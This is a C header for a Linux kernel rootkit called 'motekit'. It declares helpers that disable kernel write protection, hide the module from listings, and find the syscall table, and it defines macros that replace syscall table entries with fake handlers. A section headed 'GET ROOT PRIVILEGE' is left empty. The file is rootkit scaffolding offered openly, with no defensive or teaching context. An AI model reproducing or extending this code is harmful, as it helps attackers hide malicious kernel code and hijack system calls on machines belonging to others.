/**
Author: Mote
File:  motekit.h
**/

#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
#include <linux/slab.h>
// filp_open, filp_close.
# include <linux/fs.h>
// PDE_DATA.
# include <linux/proc_fs.h>
// struct seq_file, struct seq_operations.
# include <linux/seq_file.h>
// printk.
# include <linux/printk.h>
// struct linux_dirent64.
# include <linux/dirent.h>


// ========== WRITE_PROTECTION HELPER ==========
void
disable_wp(void);

void
enable_wp(void);

// ========== END WRITE_PROTECTION HELPER ==========

// ========== MODULE HELPER ==========

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name,
            const void *ns);
void rb_add(struct kernfs_node *node);


void module_show(void);

void module_hide(void);

// ========== END MODULE HELPER ==========


// ========== SYS_CALL_TABLE ==========
//https://github.com/nurupo/rootkit/blob/master/rootkit.c

unsigned long **
get_sct(void);

unsigned long **
get_sct_via_sys_close(void);


// ========== END SYS_CALL_TABLE ==========


// ========== HOOK HELPER ==========
// Hooking helpers for sys_call_table .
// INFO: These two macros depend on the your function naming.

# define HOOK_SCT(sct, name)                    \
    do {                                        \
        real_##name = (void *)sct[__NR_##name]; \
        sct[__NR_##name] = (void *)fake_##name; \
    } while (0)

# define UNHOOK_SCT(sct, name)                  \
    sct[__NR_##name] = (void *)real_##name

// ========== END HOOK HELPER ==========


// ========== GET ROOT PRIVILEGE ==========




// ========== END GET ROOT PRIVILEGE ==========

